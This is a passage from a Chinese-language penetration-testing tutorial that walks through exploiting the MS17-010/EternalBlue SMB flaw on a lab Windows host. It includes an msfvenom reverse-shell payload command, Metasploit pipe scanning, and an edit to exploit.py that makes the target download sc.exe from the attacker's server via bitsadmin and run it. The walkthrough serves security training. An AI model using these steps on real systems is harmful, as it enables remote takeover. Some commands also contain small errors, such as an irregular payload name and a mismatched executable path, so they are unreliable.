    漏洞利用代码似乎可以正常工作，但它需要目标 IP、`shellcode_file` 和 `numGroomConn` 参数。其中目标 IP 为 `192.168.1.129`，我们可以使用
    `msfvenom` 工具创建 `shellcode_file`，如图 5.20 所示：


    ```

    msfvenom -a x86 --platform windows -p windows/shell/reverse_shell LHOST=192.168.1.128
    LPORT=4444 > shellcode

    ```


    ![](img/Figure-5.20.jpg)


    **图 5.20：** msfvenom command


    `numGroomConn` 是一个可选参数，默认值为 13。它用于 `EternalBlue` 漏洞利用脚本的缓冲区溢出攻击。如果漏洞利用失败但目标未崩溃，请尝试增加
    `numGroomConn` 的值。


    ## 步骤 16：尝试运行漏洞利用代码


    目前，我们可以尝试使用给定的参数运行漏洞利用代码，如图 5.21 所示：


    ![](img/Figure-5.21.jpg)


    **图 5.21：** Exploit output


    尽管脚本最终未能成功运行，但调试方法具有指导意义。现在，我们将返回步骤 11 并选择另一个漏洞利用代码，例如 `42315.py` 来尝试。


    ## 步骤 17：准备新的漏洞利用代码


    重复步骤 12。现在，我们可以打开漏洞利用代码并输入目标的有效用户名和密码，如图 5.22 所示：


    ![](img/Figure-5.22.jpg)


    **图 5.22：** Exploit file


    ## 步骤 18：运行漏洞利用代码并安装 mysmb


    现在，我们可以尝试运行漏洞利用代码，如图 5.23 所示：


    ![](img/Figure-5.23.jpg)


    **图 5.23：** Run exploit file


    出现错误（No module named `mysmb`），这意味着 `mysmb` 包未安装。因此，我们将运行以下命令来修复此错误（见图 5.24）：


    ```

    wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py

    ```


    ![](img/Figure-5.24.jpg)


    **图 5.24：** Install mysmb module


    ## 步骤 19：再次运行漏洞利用代码


    再次尝试运行文件，我们得到不同的输出，如图 5.25 所示：


    ![](img/Figure-5.25.jpg)


    **图 5.25：** Run exploit file


    现在看起来像是用法信息，这是一个好迹象。我们需要插入目标的 IP 地址和管道名称作为参数。


    ## 步骤 20：查找命名管道


    命名管道是运行进程相互通信的一种低开销技术。管道通常作为文件呈现，其他进程可以附加到这些文件。Metasploit 中的扫描器将检测主机上的任何命名管道。要打开一个新终端，输入
    `msfconsole` 然后搜索扫描器，如图 5.26 所示：


    ```

    msfconsole

    search pipe

    ```


    ![](img/Figure-5.26.jpg)


    **图 5.26：** msfconsole command


    我们需要的是 `pipe_auditor`。使用 `use` 命令加载模块。


    ```

    use auxiliary/scanner/smb/pipe_auditor

    ```


    你应该会看到 `auxiliary(scanner/smb/pipe_auditor) > options` 提示符。现在，我们可以查看选项，如图 5.27
    所示：


    ![](img/Figure-5.27.jpg)


    **图 5.27：** msfconsole command_2


    我们真正需要做的就是指定目标的 IP 地址（`192.168.1.129`），见图 5.28：


    ![](img/Figure-5.28.jpg)


    **图 5.28：** msfconsole command_3


    看起来未找到命名管道。


    ## 步骤 21：运行漏洞利用代码并准备 Payload


    运行漏洞利用文件。此时我们应该能够启动漏洞利用文件。使用目标的 IP 地址，如图 5.29 所示：


    ![](img/Figure-5.29.jpg)


    **图 5.29：** Exploit output


    漏洞利用成功！我们不知道文件是否已生成，因为它在系统上而不是在 SMB 共享上。因此，我们将需要修改漏洞利用代码。我们必须首先构建一个 `shell.exe`
    文件，如图 5.30 所示：


    ![](img/Figure-5.30.jpg)


    **图 5.30：** msfvenom command


    现在，我们可以启动 Apache 服务器，以便漏洞利用代码可以从目标连接到我们的机器以获取 Payload。接下来，我们将调整代码以满足我们的需求。


    ```

    sudo systemctl start apache2

    ```


    ## 步骤 22：修改代码


    回到 `exploit.py`，找到底部附近的代码段，如图 5.31 所示：


    ![](img/Figure-5.31.jpg)


    **图 5.31：** Modify exploit file


    在这里，我们可以看到负责连接到目标并创建文本文件的代码。我们还可以看到一个有趣的函数 `service_exec()` 被注释掉了。该函数将连接到目标并发出命令，将先前创建的文本文件复制到
    C 盘上名为 `pwned_exec.txt` 的新文本文件中。我们可以使用此函数来获取我们的 Payload 并在目标上执行它。


    首先，取消注释该函数，并将 `cmd /c` 之后的所有内容替换为以下命令：


    ```

    bitsadmin /transfer pwn /download http://192.168.1.128/sc.exe C:\sc.exe

    ```


    **Background Intelligent Transfer Service**（**BITSAdmin**）是一个 Windows 命令行工具，用于上传或下载文件。`/transfer`
    开关初始化传输（本例中名称为 `pwn`），`/download` 指定这是一个下载。然后，我们输入远程文件名（托管在我们的机器上）和传输后的本地文件名。


    接下来，添加另一个 `service_exec()` 函数并让它执行我们刚刚传输的文件。代码将如下所示：


    ```

    service_exec(conn, r’cmd /c /sc.exe’)

    ```


